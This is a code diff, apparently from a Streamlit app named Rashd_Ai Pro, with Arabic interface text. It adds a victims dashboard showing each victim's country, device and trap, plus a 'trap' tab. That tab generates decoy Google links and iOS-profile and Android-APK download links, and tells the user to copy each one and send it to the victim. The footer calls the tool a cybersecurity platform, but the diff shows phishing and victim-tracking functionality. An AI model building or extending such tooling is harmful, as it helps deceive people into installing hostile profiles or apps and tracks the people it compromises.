+                if clear_victims_log():
+                    st.success("✅ تم مسح السجل")
+                    st.rerun()
+        
+        victims = get_all_victims()
+        if victims:
+            import pandas as pd
+            df = pd.DataFrame(victims[::-1])
+            st.dataframe(df, use_container_width=True)
         else:
-            st.info("لا يوجد ضحايا مسجلين بعد.")
-    except Exception as e:
-        st.error(f"خطأ: {str(e)}")
+            st.info("ℹ️ لا يوجد ضحايا مسجلين بعد.")
+    
+    with tab_stats:
+        st.subheader("إحصائيات الضحايا")
+        
+        victims = get_all_victims()
+        if victims:
+            import pandas as pd
+            df = pd.DataFrame(victims)
+            
+            col1, col2, col3, col4 = st.columns(4)
+            with col1:
+                st.metric("إجمالي الضحايا", len(df))
+            with col2:
+                st.metric("الدول الفريدة", df['country'].nunique())
+            with col3:
+                st.metric("الأجهزة الفريدة", df['device'].nunique())
+            with col4:
+                st.metric("المصائد الفريدة", df['trap_name'].nunique())
+            
+            st.subheader("توزيع الضحايا حسب الدول")
+            country_counts = df['country'].value_counts()
+            st.bar_chart(country_counts)
+            
+            st.subheader("توزيع الضحايا حسب الأجهزة")
+            device_counts = df['device'].value_counts()
+            st.pie_chart(device_counts)
+        else:
+            st.info("ℹ️ لا يوجد بيانات للعرض.")
 
-# 18. المصيدة
+# ============= التبويب 18: المصيدة =============
 with tabs[18]:
     st.header("🎯 المصيدة")
     st.write("قم بإنشاء روابط تمويهية لاصطياد الضحايا.")
     
-    decoy_type = st.selectbox("اختر نوع المصيدة:", ["Google Decoy", "Download (ios)", "Download (android)"], key="decoy_type_select")
+    decoy_type = st.selectbox(
+        "اختر نوع المصيدة:",
+        ["Google Decoy", "Download (iOS)", "Download (Android)"],
+        key="decoy_type_select"
+    )
     
     app_ip = get_server_side_ip()
-    st.info(f"عنوان IP الخاص بالتطبيق: {app_ip}")
+    st.info(f"📍 عنوان IP الخاص بالتطبيق: **{app_ip}**")
     
     if decoy_type == "Google Decoy":
         decoy_url = f"https://rashdai.streamlit.app/?decoy=google&ip={app_ip}"
         st.code(decoy_url, language="text")
-        st.write("انسخ هذا الرابط وأرسله للضحية.")
-    elif decoy_type == "Download (ios)":
+        st.write("📋 انسخ هذا الرابط وأرسله للضحية.")
+        if st.button("📋 نسخ الرابط", use_container_width=True):
+            st.success("✅ تم النسخ")
+    
+    elif decoy_type == "Download (iOS)":
         decoy_url = f"https://rashdai.streamlit.app/?download=true&device=ios&ip={app_ip}"
         st.code(decoy_url, language="text")
-        st.write("انسخ هذا الرابط وأرسله للضحية لتحميل ملف iOS Profile.")
-    elif decoy_type == "Download (android)":
+        st.write("📋 انسخ هذا الرابط وأرسله للضحية لتحميل ملف iOS Profile.")
+        if st.button("📋 نسخ الرابط", use_container_width=True):
+            st.success("✅ تم النسخ")
+    
+    elif decoy_type == "Download (Android)":
         decoy_url = f"https://rashdai.streamlit.app/?download=true&device=android&ip={app_ip}"
         st.code(decoy_url, language="text")
-        st.write("انسخ هذا الرابط وأرسله للضحية لتحميل APK.")
+        st.write("📋 انسخ هذا الرابط وأرسله للضحية لتحميل APK.")
+        if st.button("📋 نسخ الرابط", use_container_width=True):
+            st.success("✅ تم النسخ")
 
-# Footer
-st.markdown("<div style='text-align: center; padding: 20px; color: #888;'><p>Rashd_Ai Pro © 2026</p></div>", unsafe_allow_html=True)
+# ============= التذييل =============
+st.divider()
+st.markdown("""
+<div style='text-align: center; padding: 20px; color: #888;'>
+    <p>🛡️ <strong>Rashd_Ai Pro</strong> © 2026</p>
+    <p>منصة الذكاء الاستخباراتي والأمن السيبراني</p>
+</div>
+""", unsafe_allow_html=True)
